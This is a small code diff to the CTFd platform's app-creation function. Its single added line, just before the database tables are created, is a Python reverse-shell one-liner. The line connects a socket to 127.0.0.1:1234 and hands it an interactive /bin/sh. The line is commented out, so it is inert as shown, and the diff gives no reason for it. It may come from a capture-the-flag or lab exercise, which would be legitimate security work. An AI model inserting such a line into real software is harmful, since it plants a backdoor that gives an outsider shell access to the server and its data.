@@ -245,6 +245,7 @@ def create_app(config="CTFd.config.Config"):
                 cursor.execute("PRAGMA foreign_keys=ON")
                 cursor.close()
 
+            # import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
             db.create_all()
             stamp_latest_revision()
         else:
